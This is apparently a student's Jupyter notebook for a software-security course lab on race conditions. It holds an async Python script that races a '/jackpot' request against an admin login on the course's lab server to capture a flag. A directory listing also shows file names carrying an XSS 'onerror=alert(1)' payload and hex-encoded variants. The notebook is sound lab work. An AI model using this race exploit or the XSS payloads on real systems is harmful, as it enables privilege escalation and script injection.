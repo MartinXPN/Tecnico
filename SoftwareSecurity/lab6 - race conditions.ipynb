{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "import requests\n",
    "import subprocess\n",
    "import httpx\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:12202'\n",
    "user = {'username': 'yo', 'password': 'yo'}\n",
    "admin = {'username': 'admin', 'password': 'admin'}\n",
    "\n",
    "s = requests.Session()\n",
    "r = s.post(url=SERVER + '/register', data=user)\n",
    "r = s.post(url=SERVER + '/login', data=user)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "async def login_and_request_jackpot(real_credentials, fake_credentials):\n",
    "    async with httpx.AsyncClient() as c:\n",
    "        await c.post(SERVER + '/register', data=real_credentials)\n",
    "        real = await c.post(SERVER + '/login', data=real_credentials)\n",
    "#         print(real.text)\n",
    "        \n",
    "        jackpot, auth = await asyncio.gather(\n",
    "            c.get(SERVER + '/jackpot'),\n",
    "            c.post(SERVER + '/login', data=fake_credentials),\n",
    "        )\n",
    "        if 'SSof{' in jackpot.text:\n",
    "            print(jackpot.text)\n",
    "        \n",
    "#         print('------------------JACKPOT---------------')\n",
    "#         print(jackpot.text)\n",
    "#         print('------------------FAKE AUTH-------------')\n",
    "#         print(auth.text)\n",
    "\n",
    "for i in range(100):\n",
    "    await login_and_request_jackpot(real_credentials=user, fake_credentials=admin)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 272\n",
      "-rw-r--r--  1 martinmirakyan  staff     20 Oct 25 20:54  onerror=alert(1)\n",
      "-rw-r--r--  1 martinmirakyan  staff     20 Oct 25 21:40 206173646661736466617364206f6e6572726f723d22616c65727428312922\n",
      "-rw-r--r--  1 martinmirakyan  staff     20 Oct 25 21:38 206f6e6572726f723d22616c65727428312922\n",
      "-rw-r--r--  1 martinmirakyan  staff     20 Oct 25 21:35 206f6e6572726f723d616c657274283129\n",
      "-rw-r--r--  1 martinmirakyan  staff      0 Oct 25 12:48 geckodriver.log\n",
      "-rw-r--r--  1 martinmirakyan  staff   3467 Sep 28 10:33 lab0.ipynb\n",
      "-rw-r--r--  1 martinmirakyan  staff  30503 Nov  4 12:08 lab2.ipynb\n",
      "-rw-r--r--  1 martinmirakyan  staff  10751 Nov  4 20:32 lab3.ipynb\n",
      "-rw-r--r--  1 martinmirakyan  staff  44160 Oct 21 01:28 lab4.ipynb\n",
      "-rw-r--r--  1 martinmirakyan  staff   9348 Oct 26 19:43 lab5.ipynb\n",
      "-rw-r--r--  1 martinmirakyan  staff   1363 Oct 26 18:56 note.bin\n",
      "-rw-r--r--  1 martinmirakyan  staff   8196 Oct 25 23:10 project.ipynb\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(subprocess.run([\"ls\", \"-l\"], stdout=subprocess.PIPE).stdout.decode('utf-8'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
